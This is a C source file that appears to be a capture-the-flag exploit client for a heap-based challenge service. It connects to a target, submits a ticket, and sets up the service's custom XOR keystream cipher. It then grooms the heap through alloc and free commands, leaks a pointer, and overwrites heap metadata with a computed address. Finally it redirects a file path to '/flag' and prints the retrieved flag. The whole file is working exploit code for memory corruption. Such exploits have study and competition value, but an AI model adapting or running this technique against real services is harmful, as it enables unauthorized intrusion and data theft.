
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>
#include <sys/wait.h>
#include <stdint.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#include "walk.h"

void printBuf(uint8_t * buf, int len);

uint8_t cryptoKey[KEYSIZE];


#define CSTATE_SIZE 2048
uint8_t cryptoStateRead[CSTATE_SIZE];
uint8_t cryptoStateWrite[CSTATE_SIZE];
int cStateI;
int cStateJ;
struct bufData * ringStart;
int commsFD;

int baseConnect(char * target, int port);

static void __attribute__((always_inline)) initPRGA(uint8_t * cryptoState, int tweak)
{
    int j = 0;
    for(int i =0; i < CSTATE_SIZE; i++)
    {
        cryptoState[i] = i%256;
    }

    for(int i = 0; i < CSTATE_SIZE*2; i++)
    {
        unsigned int tmp = cryptoKey[(i+j) % KEYSIZE];
        unsigned int tmp2;
        tmp = (tmp + i + (j << 5) + tweak) % CSTATE_SIZE;
        tmp2 = cryptoState[i];
        cryptoState[i % CSTATE_SIZE] = cryptoState[tmp];
        cryptoState[tmp] = cryptoState[i % CSTATE_SIZE];
        j = cryptoState[cryptoState[tmp]];
    }

}

static char __attribute__((always_inline))  PRGA(uint8_t * cryptoState) {
    char ret;
    uint8_t tmp ;
    unsigned int offset1;
    ret = cryptoState[(cryptoState[cStateJ]+cStateI) % CSTATE_SIZE];
    cStateI = (cStateI + 3) % CSTATE_SIZE;
    cStateJ = cryptoState[cStateJ];

    offset1 = ((cStateI * cStateJ )^ 0xfefe) % CSTATE_SIZE;

    tmp = cryptoState[offset1];
    cryptoState[offset1] = cryptoState[(cStateJ + cStateI) % CSTATE_SIZE];
    cryptoState[(cStateJ + cStateI) % CSTATE_SIZE] = tmp;

    return ret;

}


static int __attribute__((always_inline))  readData(uint8_t * buf, unsigned int length)
{
    int readLen = 0;
    while(readLen < length)
    {
        int tempLen = read(commsFD, &buf[readLen], length - readLen);
        if(tempLen <= 0)
        {
            printf("READ FAILED\n");
            exit(3);
            return -1;   
        }
        readLen += tempLen;
    }

    for(int i =0; i < readLen; i++)
    {
        buf[i] = buf[i] ^ PRGA(cryptoStateRead);
    }

    return readLen;
}

static int __attribute__((always_inline))  writeData(uint8_t * buf, unsigned int length)
{
    int readLen = 0;
    for(int i =0; i < length; i++)
    {
        buf[i] = buf[i] ^ PRGA(cryptoStateWrite);
    }

    while(readLen < length)
    {
        int tempLen = write(commsFD, &buf[readLen], length - readLen);
        if(tempLen < 0)
        {
            return -1;   
        }
        readLen += tempLen;
    }
    return readLen;
}

void doAlloc(int size)
{
    int cmd = CMD_ALLOC;
    unsigned int ssize = size;
    writeData(&cmd, sizeof(cmd));
    writeData(&ssize, sizeof(size));
}

void doFree(int num)
{    
    int cmd = CMD_FREE;
    writeData(&cmd, sizeof(cmd));
    writeData(&num, sizeof(num));
}
void doStats()
{    
    int cmd = CMD_STATS;
    char bufData[128];
    writeData(&cmd, sizeof(cmd));
    readData(bufData, sizeof(int));
}

void printBuf(uint8_t * buf, int len)
{
    for(int i = 0; i < len; i++)
    {
        if(i % 64 ==0)
        {
            printf("\n%04X: ", i);
        }
        printf("%02X", buf[i]);
    }
    printf("\n");
}

void doThrow(int block, uintptr_t doAllocPtr)
{
    int cmd = CMD_READINTOBUF;
    int len = 4096;
    int toSendLen = len;
    uint8_t buf[len];
    uint64_t* buf2 = (uint64_t *)buf;
    for(int i = 0; i < len/sizeof(uint64_t); i++)
    {
        buf2[i]  = i;
    }
//next is 0x1c0
//prev is 0x1c1
//urandom is at 0x7060
//magic is at 0x1330
    buf2[0x1c0] = doAllocPtr - 32 + (0x70e0-0x1450);

    writeData(&cmd, sizeof(cmd));
    writeData(&block, sizeof(block));
    writeData(&toSendLen, sizeof(toSendLen));
    writeData(buf, len);

}

void doUrandOverwrite(int block)
{
    int cmd = CMD_READINTOBUF;
    char buf[] = "/flag\x00";
    int toSendLen = strlen(buf)+1;

    writeData(&cmd, sizeof(cmd));
    writeData(&block, sizeof(block));
    writeData(&toSendLen, sizeof(toSendLen));
    writeData(buf, strlen(buf)+1);

}

uintptr_t getData(int num)
{
    int cmd = CMD_GETDATA;
    char totalData[8192*4];
    uintptr_t magic;
    unsigned int len;
    memset(totalData, 0, sizeof(totalData));

    writeData(&cmd, sizeof(cmd));
    writeData(&num, sizeof(num));

    readData(&len, sizeof(len));
    printf("Getting %d Bytes\n", len);
    readData(totalData, len);
    printBuf(totalData, len);
    printf("Getting Pointer\n");
    memcpy(&magic, &totalData[len-48], sizeof(magic));
    printf("%p\n",magic);
    return magic;

}

int main()
{
    int fd = baseConnect(getenv("TARGET_IP"),atoi(getenv("TARGET_PORT")));
    char ticketBuf[2048];
    sleep(1);
    read(fd, ticketBuf, 2048);
    strncpy(ticketBuf, getenv("TICKET"), 2040);
    strcat(ticketBuf, "\n");
    write(fd,ticketBuf,strlen(ticketBuf));

    read(fd, cryptoKey, sizeof(cryptoKey));
    initPRGA(cryptoStateWrite,1);
    initPRGA(cryptoStateRead,31);
    sleep(2);
    commsFD= fd;
    int cmd = CMD_NOP;
  //  doFree(0);
 //   doFree(1);
 //   doFree(2);
   // doAlloc(2048);
    doStats();
    for(int i = 0; i <101; i++)
    {
        int allocSize = 64;
        doAlloc(allocSize);
    }
    doStats();
    //getData(0);
    for(int i = 0;i<101;i++)
    {
        int block = 1;
        doFree(block);
    }
    doStats();
    doAlloc(3584);
    doAlloc(128);
    doAlloc(128);
    doAlloc(128);
    doStats();
    uintptr_t allocPtr = getData(0);
    doThrow(0, allocPtr);
//    doStats();
    doUrandOverwrite(2);
    cmd = CMD_REKEY;
    writeData(&cmd, sizeof(cmd));
    char flagData[256];
    read(fd, flagData, 256);
    printf("GOT FLAG %s\n", flagData);



	return 0;
}


int baseConnect(char * target, int port)
{
    int socketFD;
    struct sockaddr_in server_addr;
    socketFD = socket(AF_INET, SOCK_STREAM, 0);
    struct timeval timeout;

    if(socketFD < 0)
    {
        printf("Failed to create socket\n");
        return -1;
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(target);

    if(connect(socketFD,(const struct sockaddr *) &server_addr, sizeof(server_addr)) < 0)
    {
        return -1;
    }
    timeout.tv_sec  = 5;
    timeout.tv_usec = 0;

    if(setsockopt(socketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)))
    {
        printf("[-] Failed to set recv timeout\n");
    }
    if(setsockopt(socketFD, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)))
    {
        printf("[-] Failed to set send timeout\n");
    }

    return socketFD;
}
